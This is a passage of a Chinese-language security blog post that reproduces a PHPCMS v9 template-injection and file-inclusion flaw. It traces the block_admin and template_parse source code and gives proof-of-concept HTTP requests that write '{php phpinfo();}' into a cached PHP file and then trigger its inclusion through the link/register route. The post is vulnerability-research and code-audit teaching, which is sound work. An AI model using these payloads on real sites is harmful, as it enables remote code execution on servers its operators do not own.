(file_exists($filepath)) &#123;</span><br><span class="line">          $classname = $filename;</span><br><span class="line">          <span class="keyword">include</span> $filepath;</span><br><span class="line">          <span class="keyword">if</span> ($mypath = pc_base::my_path($filepath)) &#123;</span><br><span class="line">              $classname = <span class="string">'MY_'</span>.$filename;</span><br><span class="line">              <span class="keyword">include</span> $mypath;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span>(class_exists($classname))&#123;</span><br><span class="line">              <span class="keyword">return</span> <span class="keyword">new</span> $classname;</span><br><span class="line">          &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">              <span class="keyword">exit</span>(<span class="string">'Controller does not exist.'</span>);</span><br><span class="line">           &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">exit</span>(<span class="string">'Controller does not exist.'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<p>包含控制器类文件，实例化控制器并返回，具体文件路径：modules/模块名/控制器名.php<br> (默认加载modules/content/index.php)<br> 返回之后，就可以通过ROUTE_A,选择事件。</p>
<p>总结一下(这是从师傅那儿转的)<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">核心类库在 phpcms/libs/classes/</span><br><span class="line"></span><br><span class="line">模型类库在 phpcms/model/</span><br><span class="line"></span><br><span class="line">应用目录 phpcms/modules/</span><br><span class="line"></span><br><span class="line">配置目录 caches/configs/</span><br><span class="line"></span><br><span class="line">全局变量被转义，$_SERVER 除外</span><br><span class="line"></span><br><span class="line">模块名、控制器名、方法名中的 /、.会被过滤</span><br><span class="line"></span><br><span class="line">方法名不允许以 _ 开头</span><br></pre></td></tr></table></figure></p>
<h2 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h2><p>定位phpcms/modules/block/block_admin.php::block_update() 120行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">block_update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $id = <span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) &amp;&amp; intval($_GET[<span class="string">'id'</span>]) ? intval($_GET[<span class="string">'id'</span>]) :  showmessage(L(<span class="string">'illegal_operation'</span>), HTTP_REFERER);</span><br><span class="line">        <span class="comment">//进行权限判断</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;roleid != <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;priv_db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'blockid'</span>=&gt;$id, <span class="string">'roleid'</span>=&gt;<span class="keyword">$this</span>-&gt;roleid, <span class="string">'siteid'</span>=&gt;<span class="keyword">$this</span>-&gt;siteid))) &#123;</span><br><span class="line">                showmessage(L(<span class="string">'not_have_permissions'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$data = <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$id))) &#123;</span><br><span class="line">            showmessage(L(<span class="string">'nofound'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'dosubmit'</span>])) &#123;</span><br><span class="line">            $sql = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">if</span> ($data[<span class="string">'type'</span>] == <span class="number">2</span>) &#123;</span><br><span class="line">                $title = <span class="keyword">isset</span>($_POST[<span class="string">'title'</span>]) ? $_POST[<span class="string">'title'</span>] : <span class="string">''</span>;</span><br><span class="line">                $url = <span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]) ? $_POST[<span class="string">'url'</span>] : <span class="string">''</span>;</span><br><span class="line">                $thumb = <span class="keyword">isset</span>($_POST[<span class="string">'thumb'</span>]) ? $_POST[<span class="string">'thumb'</span>] : <span class="string">''</span>;</span><br><span class="line">                $desc = <span class="keyword">isset</span>($_POST[<span class="string">'desc'</span>]) ? $_POST[<span class="string">'desc'</span>] : <span class="string">''</span>;</span><br><span class="line">                $template = <span class="keyword">isset</span>($_POST[<span class="string">'template'</span>]) &amp;&amp; trim($_POST[<span class="string">'template'</span>]) ? trim($_POST[<span class="string">'template'</span>]) : <span class="string">''</span>;</span><br><span class="line">                $datas = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">foreach</span> ($title <span class="keyword">as</span> $key=&gt;$v) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">empty</span>($v) || !<span class="keyword">isset</span>($url[$key]) ||<span class="keyword">empty</span>($url[$key])) <span class="keyword">continue</span>;</span><br><span class="line">                    $datas[$key] = <span class="keyword">array</span>(<span class="string">'title'</span>=&gt;$v, <span class="string">'url'</span>=&gt;$url[$key], <span class="string">'thumb'</span>=&gt;$thumb[$key], <span class="string">'desc'</span>=&gt;str_replace(<span class="keyword">array</span>(chr(<span class="number">13</span>), chr(<span class="number">43</span>)), <span class="keyword">array</span>(<span class="string">''</span>, <span class="string">' '</span>), $desc[$key]));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ($template) &#123;</span><br><span class="line">                    $block = pc_base::load_app_class(<span class="string">'block_tag'</span>);</span><br><span class="line">                    $block-&gt;template_url($id, $template);</span><br><span class="line"></span><br><span class="line">               ... ...</span><br><span class="line">               ... ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>关键代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$block-&gt;template_url($id, $template);</span><br></pre></td></tr></table></figure></p>
<p>跟进template_url()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 生成模板返回路径</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> integer $id 碎片ID号</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> string $template 风格</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">template_url</span><span class="params">($id, $template = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">     $filepath = CACHE_PATH.<span class="string">'caches_template'</span>.DIRECTORY_SEPARATOR.<span class="string">'block'</span>.DIRECTORY_SEPARATOR.$id.<span class="string">'.php'</span>;</span><br><span class="line">     $dir = dirname($filepath);</span><br><span class="line">     <span class="keyword">if</span> ($template) &#123;</span><br><span class="line">         <span class="keyword">if</span>(!is_dir($dir)) &#123;</span><br><span class="line">             mkdir($dir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">         &#125;</span><br><span class="line">         $tpl = pc_base::load_sys_class(<span class="string">'template_cache'</span>);</span><br><span class="line">         $str = $tpl-&gt;template_parse(new_stripslashes($template));</span><br><span class="line">         @file_put_contents($filepath, $str);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">if</span> (!file_exists($filepath)) &#123;</span><br><span class="line">             <span class="keyword">if</span>(!is_dir($dir)) &#123;</span><br><span class="line">                 mkdir($dir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">             &#125;</span><br><span class="line">             $tpl = pc_base::load_sys_class(<span class="string">'template_cache'</span>);</span><br><span class="line">             $str = <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$id), <span class="string">'template'</span>);</span><br><span class="line">             $str = $tpl-&gt;template_parse($str[<span class="string">'template'</span>]);</span><br><span class="line">             @file_put_contents($filepath, $str);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> $filepath;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
<p>其中id和template都是我们可以控制的,$str是我们传入的$template，经过template_parse()过滤后而来的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 解析模板</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> $str    模板内容</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> ture</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 解析模板</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $str	模板内容</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> ture</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">template_parse</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">	$str = preg_replace ( <span class="string">"/\&#123;template\s+(.+)\&#125;/"</span>, <span class="string">"&lt;?php include template(\\1); ?&gt;"</span>, $str );</span><br><span class="line">	$str = preg_replace ( <span class="string">"/\&#123;include\s+(.+)\&#125;/"</span>, <span class="string">"&lt;?php include \\1; ?&gt;"</span>, $str );</span><br><span class="line">	$str = preg_replace ( <span class="string">"/\&#123;php\s+(.+)\&#125;/"</span>, <span class="string">"&lt;?php \\1?&gt;"</span>, $str );</span><br><span class="line">	$str = preg_replace ( <span class="string">"/\&#123;if\s+(.+?)\&#125;/"</span>, <span class="string">"&lt;?php if(\\1) &#123; ?&gt;"</span>, $str );</span><br><span class="line">	$str = preg_replace ( <span class="string">"/\&#123;else\&#125;/"</span>, <span class="string">"&lt;?php &#125; else &#123; ?&gt;"</span>, $str );</span><br><span class="line">	$str = preg_replace ( <span class="string">"/\&#123;elseif\s+(.+?)\&#125;/"</span>, <span class="string">"&lt;?php &#125; elseif (\\1) &#123; ?&gt;"</span>, $str );</span><br><span class="line">	$str = preg_replace ( <span class="string">"/\&#123;\/if\&#125;/"</span>, <span class="string">"&lt;?php &#125; ?&gt;"</span>, $str );</span><br><span class="line">	<span class="comment">//for 循环</span></span><br><span class="line">	$str = preg_replace(<span class="string">"/\&#123;for\s+(.+?)\&#125;/"</span>,<span class="string">"&lt;?php for(\\1) &#123; ?&gt;"</span>,$str);</span><br><span class="line">	$str = preg_replace(<span class="string">"/\&#123;\/for\&#125;/"</span>,<span class="string">"&lt;?php &#125; ?&gt;"</span>,$str);</span><br><span class="line">	<span class="comment">//++ --</span></span><br><span class="line">	$str = preg_replace(<span class="string">"/\&#123;\+\+(.+?)\&#125;/"</span>,<span class="string">"&lt;?php ++\\1; ?&gt;"</span>,$str);</span><br><span class="line">	$str = preg_replace(<span class="string">"/\&#123;\-\-(.+?)\&#125;/"</span>,<span class="string">"&lt;?php ++\\1; ?&gt;"</span>,$str);</span><br><span class="line">	$str = preg_replace(<span class="string">"/\&#123;(.+?)\+\+\&#125;/"</span>,<span class="string">"&lt;?php \\1++; ?&gt;"</span>,$str);</span><br><span class="line">	$str = preg_replace(<span class="string">"/\&#123;(.+?)\-\-\&#125;/"</span>,<span class="string">"&lt;?php \\1--; ?&gt;"</span>,$str);</span><br><span class="line">	$str = preg_replace ( <span class="string">"/\&#123;loop\s+(\S+)\s+(\S+)\&#125;/"</span>, <span class="string">"&lt;?php \$n=1;if(is_array(\\1)) foreach(\\1 AS \\2) &#123; ?&gt;"</span>, $str );</span><br><span class="line">	$str = preg_replace ( <span class="string">"/\&#123;loop\s+(\S+)\s+(\S+)\s+(\S+)\&#125;/"</span>, <span class="string">"&lt;?php \$n=1; if(is_array(\\1)) foreach(\\1 AS \\2 =&gt; \\3) &#123; ?&gt;"</span>, $str );</span><br><span class="line">	$str = preg_replace ( <span class="string">"/\&#123;\/loop\&#125;/"</span>, <span class="string">"&lt;?php \$n++;&#125;unset(\$n); ?&gt;"</span>, $str );</span><br><span class="line">	$str = preg_replace ( <span class="string">"/\&#123;([a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff:]*\(([^&#123;&#125;]*)\))\&#125;/"</span>, <span class="string">"&lt;?php echo \\1;?&gt;"</span>, $str );</span><br><span class="line">	$str = preg_replace ( <span class="string">"/\&#123;\\$([a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff:]*\(([^&#123;&#125;]*)\))\&#125;/"</span>, <span class="string">"&lt;?php echo \\1;?&gt;"</span>, $str );</span><br><span class="line">	$str = preg_replace ( <span class="string">"/\&#123;(\\$[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*)\&#125;/"</span>, <span class="string">"&lt;?php echo \\1;?&gt;"</span>, $str );</span><br><span class="line">	$str = preg_replace_callback(<span class="string">"/\&#123;(\\$[a-zA-Z0-9_\[\]\'\"\$\x7f-\xff]+)\&#125;/s"</span>,  <span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="string">'addquote'</span>),$str);</span><br><span class="line">	$str = preg_replace ( <span class="string">"/\&#123;([A-Z_\x7f-\xff][A-Z0-9_\x7f-\xff]*)\&#125;/s"</span>, <span class="string">"&lt;?php echo \\1;?&gt;"</span>, $str );</span><br><span class="line">	$str = preg_replace_callback(<span class="string">"/\&#123;pc:(\w+)\s+([^&#125;]+)\&#125;/i"</span>, <span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="string">'pc_tag_callback'</span>), $str);</span><br><span class="line">	$str = preg_replace_callback(<span class="string">"/\&#123;\/pc\&#125;/i"</span>, <span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="string">'end_pc_tag'</span>), $str);</span><br><span class="line">	$str = <span class="string">"&lt;?php defined('IN_PHPCMS') or exit('No permission resources.'); ?&gt;"</span> . $str;</span><br><span class="line">	<span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>然后对$templatem没有影响，但是经过这个函数后，我们输入的$template，就会加上一段<strong>&lt;?php defined(‘IN_PHPCMS’) or exit(‘No permission resources.’); ?&gt;</strong>，那么加入我们的恶意php文件上传成功，</p>
<h3 id="POC-0x01"><a href="#POC-0x01" class="headerlink" title="POC 0x01"></a>POC 0x01</h3><p>这里有一个很有意思的地方，那就是我们这里的block_update()，从逻辑上说，这是一段用于更新的代码，然后我们首先，需要先创建一个id，使得数据库中有一个id的数据是可以更新的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!$data = <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$id))) &#123;</span><br><span class="line">           showmessage(L(<span class="string">'nofound'</span>));</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure></p>
<p>添加id的代码,跟进add()函数<br>定位phpcms/modules/block/block_admin.php::add() 120行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$pos = <span class="keyword">isset</span>($_GET[<span class="string">'pos'</span>]) &amp;&amp; trim($_GET[<span class="string">'pos'</span>]) ? trim($_GET[<span class="string">'pos'</span>]) : showmessage(L(<span class="string">'illegal_operation'</span>));</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'dosubmit'</span>])) &#123;</span><br><span class="line">			$name = <span class="keyword">isset</span>($_POST[<span class="string">'name'</span>]) &amp;&amp; trim($_POST[<span class="string">'name'</span>]) ? trim($_POST[<span class="string">'name'</span>]) : showmessage(L(<span class="string">'illegal_operation'</span>), HTTP_REFERER);</span><br><span class="line">			$type = <span class="keyword">isset</span>($_POST[<span class="string">'type'</span>]) &amp;&amp; intval($_POST[<span class="string">'type'</span>]) ? intval($_POST[<span class="string">'type'</span>]) : <span class="number">1</span>;</span><br><span class="line">			<span class="comment">//判断名称是否已经存在</span></span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'name'</span>=&gt;$name))) &#123;</span><br><span class="line">				showmessage(L(<span class="string">'name'</span>).L(<span class="string">'exists'</span>), HTTP_REFERER);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> ($id = <span class="keyword">$this</span>-&gt;db-&gt;insert(<span class="keyword">array</span>(<span class="string">'name'</span>=&gt;$name, <span class="string">'pos'</span>=&gt;$pos, <span class="string">'type'</span>=&gt;$type, <span class="string">'siteid'</span>=&gt;<span class="keyword">$this</span>-&gt;siteid), <span class="keyword">true</span>)) &#123;</span><br><span class="line">				<span class="comment">//设置权限</span></span><br><span class="line">				$priv = <span class="keyword">isset</span>($_POST[<span class="string">'priv'</span>]) ? $_POST[<span class="string">'priv'</span>] : <span class="string">''</span>;</span><br><span class="line">				<span class="keyword">if</span> (!<span class="keyword">empty</span>($priv)) &#123;</span><br><span class="line">					<span class="keyword">if</span> (is_array($priv)) <span class="keyword">foreach</span> ($priv <span class="keyword">as</span> $v) &#123;</span><br><span class="line">						<span class="keyword">if</span> (<span class="keyword">empty</span>($v)) <span class="keyword">continue</span>;</span><br><span class="line">						<span class="keyword">$this</span>-&gt;priv_db-&gt;insert(<span class="keyword">array</span>(<span class="string">'roleid'</span>=&gt;$v, <span class="string">'blockid'</span>=&gt;$id, <span class="string">'siteid'</span>=&gt;<span class="keyword">$this</span>-&gt;siteid));</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				showmessage(L(<span class="string">'operation_success'</span>), <span class="string">'?m=block&amp;c=block_admin&amp;a=block_update&amp;id='</span>.$id);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				showmessage(L(<span class="string">'operation_failure'</span>), HTTP_REFERER);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$show_header = $show_validator = <span class="keyword">true</span>;</span><br><span class="line">			pc_base::load_sys_class(<span class="string">'form'</span>);</span><br><span class="line">			$administrator = getcache(<span class="string">'role'</span>, <span class="string">'commons'</span>);</span><br><span class="line">			<span class="keyword">unset</span>($administrator[<span class="number">1</span>]);</span><br><span class="line">			<span class="keyword">include</span> <span class="keyword">$this</span>-&gt;admin_tpl(<span class="string">'block_add_edit'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($id = <span class="keyword">$this</span>-&gt;db-&gt;insert(<span class="keyword">array</span>(<span class="string">'name'</span>=&gt;$name, <span class="string">'pos'</span>=&gt;$pos, <span class="string">'type'</span>=&gt;$type, <span class="string">'siteid'</span>=&gt;<span class="keyword">$this</span>-&gt;siteid), <span class="keyword">true</span>))</span><br></pre></td></tr></table></figure></p>
<p>创建一个id,然后我们现在构造payload:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?m=block&amp;c=block_admin&amp;a=add&amp;pos=<span class="number">1</span>&amp;pc_hash=gh43rD</span><br><span class="line">POST:dosubmit=<span class="number">1</span>&amp;name=cookie&amp;type=<span class="number">2</span></span><br></pre></td></tr></table></figure></p>
<p>其中的<strong>type=2</strong>,此参数是为后续准备的。<br><img src="/2019/07/16/phpcmsv9文件包含漏洞-复现/2.png" alt=""></p>
<p>然后插入template参数,payload如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?m=block&amp;c=block_admin&amp;a=block_update&amp;id=<span class="number">2</span>&amp;pc_hash=iMIUs3</span><br><span class="line">POST:dosubmit=<span class="number">1</span>&amp;name=bb&amp;type=<span class="number">2</span>&amp;url=&amp;thumb=&amp;desc=&amp;template=&#123;php phpinfo();&#125;</span><br></pre></td></tr></table></figure></p>
<p>这个url，是自动跳转的，填入POST参数就行。<br><img src="/2019/07/16/phpcmsv9文件包含漏洞-复现/3.png" alt=""></p>
<p>看一下服务器<br><img src="/2019/07/16/phpcmsv9文件包含漏洞-复现/4.png" alt=""><br>写入成功</p>
<h3 id="POC-0x02"><a href="#POC-0x02" class="headerlink" title="POC 0x02"></a>POC 0x02</h3><p>但是里面的这段话，会因为<strong>‘IN_PHPCMS’</strong>,为false,而退出木马程序，那么一般思路下，我们读取木马文件的思路就不行。</p>
<p>然后看到pc_tag()<br>定位：/phpcms/modules/block/classes/block_tag.class.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pc_tag</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">		$siteid = <span class="keyword">isset</span>($data[<span class="string">'siteid'</span>]) &amp;&amp; intval($data[<span class="string">'siteid'</span>]) ? intval($data[<span class="string">'siteid'</span>]) : get_siteid();</span><br><span class="line">		$r = <span class="keyword">$this</span>-&gt;db-&gt;select(<span class="keyword">array</span>(<span class="string">'pos'</span>=&gt;$data[<span class="string">'pos'</span>], <span class="string">'siteid'</span>=&gt;$siteid));</span><br><span class="line">		$str = <span class="string">''</span>;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">empty</span>($r) &amp;&amp; is_array($r)) <span class="keyword">foreach</span> ($r <span class="keyword">as</span> $v) &#123;</span><br><span class="line">			<span class="keyword">if</span> (defined(<span class="string">'IN_ADMIN'</span>) &amp;&amp; !defined(<span class="string">'HTML'</span>)) $str .= <span class="string">'&lt;div id="block_id_'</span>.$v[<span class="string">'id'</span>].<span class="string">'" class="admin_block" blockid="'</span>.$v[<span class="string">'id'</span>].<span class="string">'"&gt;'</span>;</span><br><span class="line">			<span class="keyword">if</span> ($v[<span class="string">'type'</span>] == <span class="string">'2'</span>) &#123;</span><br><span class="line">				extract($v, EXTR_OVERWRITE);</span><br><span class="line">				$data = string2array($data);</span><br><span class="line">				<span class="keyword">if</span> (!defined(<span class="string">'HTML'</span>))  &#123;</span><br><span class="line">					ob_start();</span><br><span class="line">					<span class="keyword">include</span> <span class="keyword">$this</span>-&gt;template_url($id);</span><br><span class="line">					$str .= ob_get_contents();</span><br><span class="line">					ob_clean();</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">include</span> <span class="keyword">$this</span>-&gt;template_url($id);</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				$str .= $v[<span class="string">'data'</span>];</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (defined(<span class="string">'IN_ADMIN'</span>)  &amp;&amp; !defined(<span class="string">'HTML'</span>)) $str .= <span class="string">'&lt;/div&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $str;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="keyword">$this</span>-&gt;template_url($id);</span><br></pre></td></tr></table></figure></p>
<p>文件包含漏洞，然后最骚的就是，全局搜素pc_tag(),会发现在register.php中调用，然后全局搜索register,发现<br>定位：phpcms/modules/link/index.php中有这么一段代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> template(<span class="string">'link'</span>, <span class="string">'register'</span>)</span><br></pre></td></tr></table></figure></p>
<p>跟进后，发现这个函数是可以产生缓存文件的，而这个缓存文件调用了pc_tag()，可包含所以最终payload为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?m=link&amp;c=index&amp;a=register&amp;siteid=<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/07/16/phpcmsv9文件包含漏洞-复现/5.png" alt=""></p>
<h2 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h2><p>再一次感谢<a href="https://www.freebuf.com/author/wnltc0" target="_blank" rel="noopener">wnltc0师傅</a>，不厌其烦地和我解释我不懂的地方<br><img src="/2019/07/16/phpcmsv9文件包含漏洞-复现/6.png" alt=""></p>
<p>代码审计思路(转的….)<br>方案一：先对核心类库进行审计，如果找到漏洞，那么在网站中可能会存在多处相同的漏洞，就算找不到漏洞，那对核心类库中的方法也多少了解，后面对具体应用功能审计时也会轻松一些</p>
<p>方案二：直接审计功能点，优点：针对性更强；缺点：某个功能点可能调用了多个核心类库中的方法，由于对核心类库不了解，跟读时可能会比较累，需要跟的东西可能会比较多</p>
<p>//无论哪种方案，没耐心是不行滴；如果你审计时正好心烦躁的很，那你可以在安装好应用后，随便点点，开着bp，抓抓改改，发现觉得可能存在问题的点再跟代码，这种方式(有点偏黑盒)能发现一些比较明显的问题，想深入挖掘，建议参考前面两种方案</p>

        </section>
    </article>
    
        <!-- disqus 评论框 start -->
        <div class="comment">
            <div id="disqus_thread" class="disqus-thread">
              <i>Loading comments box needs to over the wall</i>
            </div>
        </div>
        <!-- disqus 评论框 end -->
    
    
        <!-- livere 评论框 start -->
        <div class="comment">
            <div id="lv-container" data-id="city" data-uid="your_livere_uid"></div>
        </div>
        <!-- livere 评论框 end -->
        
  </div>
  <aside>
    
    <div class="toc-container">
        <h1>目录</h1>
        <div class="content">
